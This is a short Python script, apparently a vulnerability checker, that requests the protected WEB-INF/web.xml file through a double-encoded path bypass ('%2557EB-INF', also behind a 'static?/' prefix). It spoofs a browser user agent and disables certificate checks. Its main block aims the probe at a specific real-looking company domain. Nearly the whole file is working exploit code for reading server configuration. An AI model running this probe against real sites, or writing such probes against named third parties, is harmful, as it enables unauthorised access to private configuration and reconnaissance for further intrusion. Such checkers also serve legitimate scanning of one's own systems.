import requests, re, urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def doCheck(url):
    try:
        if url[-1] != "/":
            url = url + "/"
        target_url = url + "%2557EB-INF/web.xml"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
        response = requests.get(target_url, headers=headers, timeout=5, verify=False)
        reditList = response.history
        if response.status_code == 200 and "<web-app>" in response.text and "<servlet-mapping>" in response.text and "application/xml" in \
                response.headers["Content-Type"]:
            r0 = True
        else:
            r0 = False
    except:
        r0 = False
    try:
        if url[-1] != "/":
            url = url + "/"
        target_url = url + "static?/%2557EB-INF/web.xml"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
        response = requests.get(target_url, headers=headers, timeout=5, verify=False)
        reditList = response.history
        if response.status_code == 200 and "<web-app>" in response.text and "<servlet-mapping>" in response.text and "application/xml" in \
                response.headers["Content-Type"]:
            r1 = True
        else:
            r1 = False
    except:
        r1 = False
    if r0 or r1:
        return target_url
    else:
        return False


if __name__ == '__main__':
    print(doCheck("http://edoc.aeonlife.com.cn/"))